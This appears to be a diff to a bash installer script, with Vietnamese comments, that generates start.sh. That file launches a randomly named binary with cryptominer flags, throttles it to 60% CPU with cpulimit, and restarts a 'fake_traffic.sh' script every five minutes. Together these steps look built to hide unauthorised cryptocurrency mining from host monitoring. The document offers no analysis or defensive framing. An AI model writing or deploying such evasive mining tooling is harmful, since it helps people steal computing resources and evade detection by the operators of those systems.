@@ -66,16 +66,28 @@ done
 EOF
 chmod +x fake_traffic.sh
 
-# Tạo script start.sh
 cat <<EOF > start.sh
 #!/bin/bash
 export PATH=".:\$PATH"  # Thêm thư mục hiện tại vào PATH
-$RAND_NAME --donate-level 1 --cpu-priority 3 --randomx-1gb-pages
+
+# Khởi chạy $RAND_NAME và giới hạn CPU
+$RAND_NAME --donate-level 1 --cpu-priority 3 --randomx-1gb-pages &
+exec_pid=\$!
+cpulimit -p \$exec_pid -l 60 &
+
+# Lặp lại việc chạy fake_traffic.sh mỗi 5 phút
 while true; do
-    exec_pid=\$!
-    cpulimit -p \$exec_pid -l 60 &
-    ./fake_traffic.sh &  # Chạy fake traffic trong background
-    sleep 300  # Chờ 5 phút trước khi lặp lại
+    # Kill tiến trình fake_traffic.sh cũ nếu có
+    if [[ -n "\$fake_traffic_pid" ]]; then
+        kill \$fake_traffic_pid 2>/dev/null
+    fi
+
+    # Khởi chạy fake_traffic.sh mới
+    ./fake_traffic.sh &
+    fake_traffic_pid=\$!
+
+    # Chờ 5 phút trước khi lặp lại
+    sleep 300
 done
 EOF
 chmod +x start.sh
